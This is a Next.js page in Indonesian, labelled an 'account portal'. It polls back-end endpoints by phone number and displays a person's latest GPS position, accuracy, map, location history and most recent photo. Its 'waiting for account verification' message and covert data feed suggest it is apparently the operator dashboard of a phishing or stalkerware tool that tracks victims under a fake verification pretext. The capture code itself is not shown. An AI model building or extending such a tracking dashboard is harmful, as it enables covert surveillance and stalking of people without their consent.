"use client";

import { Suspense } from "react";
import { useParams } from "next/navigation";
import { useEffect, useState } from "react";

type Loc = {
  phone: string;
  lat: number;
  lng: number;
  accuracy?: number;
  timestamp: number;
};

export default function PortalPage() {
  return (
    <Suspense fallback={<div className="min-h-screen bg-slate-900 text-white flex items-center justify-center">Memuat...</div>}>
      <PortalInner />
    </Suspense>
  );
}

function PortalInner() {
  const params = useParams<{ phone: string }>();
  const id = params?.phone ?? "";
  const [latest, setLatest] = useState<Loc | null>(null);
  const [history, setHistory] = useState<Loc[]>([]);
  const [error, setError] = useState("");
  const [photo, setPhoto] = useState<string | null>(null);

  useEffect(() => {
    if (!id) return;
    let active = true;
    async function load() {
      try {
        const res = await fetch(`/api/location?id=${encodeURIComponent(id)}`);
        const data = await res.json();
        if (!res.ok) throw new Error(data.error);
        if (active) {
          setLatest(data.latest);
          setHistory(data.history ?? []);
        }
      } catch (e: any) {
        if (active) setError(e.message || "gagal memuat");
      }
      try {
        const pres = await fetch(`/api/media?id=${encodeURIComponent(id)}`);
        const pdata = await pres.json();
        if (active && pdata.latest?.dataUrl) setPhoto(pdata.latest.dataUrl);
      } catch {}
    }
    load();
    const t = setInterval(load, 5000);
    return () => {
      active = false;
      clearInterval(t);
    };
  }, [id]);

  const mapSrc = latest
    ? `https://www.openstreetmap.org/export/embed.html?bbox=${latest.lng - 0.01},${latest.lat - 0.01},${latest.lng + 0.01},${latest.lat + 0.01}&layer=mapnik&marker=${latest.lat},${latest.lng}`
    : null;

  return (
    <main className="min-h-screen bg-slate-900 text-white p-6">
      <div className="max-w-4xl mx-auto">
        <h1 className="text-2xl font-bold mb-2">Portal Akun</h1>
        <p className="text-slate-300 mb-4">
          ID: <span className="font-mono">{id}</span>
        </p>

        {error && <div className="p-3 bg-red-500/20 border border-red-500 rounded mb-4">{error}</div>}

        {!latest && (
          <div className="p-6 bg-slate-800 rounded-xl text-center text-slate-300">
            Belum ada data. Menunggu verifikasi akun...
          </div>
        )}

        {latest && (
          <div className="space-y-4">
            <div className="bg-slate-800 p-4 rounded-xl">
              <p className="text-sm">
                Terakhir: {new Date(latest.timestamp).toLocaleString()}
              </p>
              <p className="text-sm">
                Lat: {latest.lat}, Lng: {latest.lng}, Akurasi: {Math.round(latest.accuracy ?? 0)} m
              </p>
              <a
                href={`https://www.google.com/maps?q=${latest.lat},${latest.lng}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-blue-400 hover:underline text-sm"
              >
                Buka di Peta
              </a>
            </div>

            {photo && (
              <div className="bg-slate-800 p-4 rounded-xl">
                <h2 className="font-semibold mb-2">Foto Terakhir</h2>
                <img src={photo} alt="foto" className="rounded-lg w-full max-w-sm" />
              </div>
            )}

            {mapSrc && (
              <iframe
                title="map"
                src={mapSrc}
                className="w-full h-96 rounded-xl border border-slate-700"
              />
            )}

            <div className="bg-slate-800 p-4 rounded-xl">
              <h2 className="font-semibold mb-2">Riwayat ({history.length})</h2>
              <ul className="max-h-60 overflow-auto text-sm space-y-1">
                {history
                  .slice()
                  .reverse()
                  .map((h, i) => (
                    <li key={i} className="text-slate-300">
                      {new Date(h.timestamp).toLocaleTimeString()} — {h.lat.toFixed(5)},{" "}
                      {h.lng.toFixed(5)}
                    </li>
                  ))}
              </ul>
            </div>
          </div>
        )}
      </div>
    </main>
  );
}